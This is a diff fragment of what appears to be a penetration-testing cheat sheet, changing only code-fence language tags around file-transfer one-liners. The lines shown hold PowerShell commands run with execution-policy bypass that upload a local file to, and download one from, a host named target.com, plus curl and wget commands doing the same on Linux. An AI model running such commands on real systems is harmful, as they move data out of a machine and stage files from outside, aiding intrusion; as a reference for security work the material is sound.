@@ -50,14 +50,14 @@ sudo httpsrv.py --bind=0.0.0.0 80
 
 Windows upload & download
 
-```
+```batch
 powershell -ep bypass -c "$wc=New-Object Net.WebClient;$wc.UploadFile('http://target.com/upload.bin', 'PUT', 'c:\\upload.bin');"
 powershell -ep bypass -c "$wc=New-Object Net.WebClient;$wc.DownloadFile('http://target.com/download.bin','c:\\download.bin');"
 ```
 
 Linux upload & download
 
-```
+```bash
 curl -X PUT --upload-file upload.bin http://target.com/upload.bin
 wget -O- --method=PUT --body-file=upload.bin http://target.com/upload.bin
 wget http://target.com/download.bin -O /tmp/download.bin
